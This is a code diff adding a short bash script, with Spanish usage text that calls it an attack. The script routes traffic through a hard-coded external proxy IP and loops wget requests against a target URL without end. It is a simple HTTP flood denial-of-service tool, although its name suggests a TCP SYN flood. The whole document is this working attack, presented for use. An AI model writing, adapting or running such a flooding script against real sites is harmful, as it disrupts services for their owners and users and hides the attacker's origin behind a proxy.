@@ -1,0 +1,8 @@
+#!/bin/bash
+echo 
+echo "Uso: ./tcpsynproxy <url>"
+echo "parar ataque con Control + C"
+export http_proxy=http://83.61.22.207:8085
+while true; do
+        wget -O /dev/null $1
+done
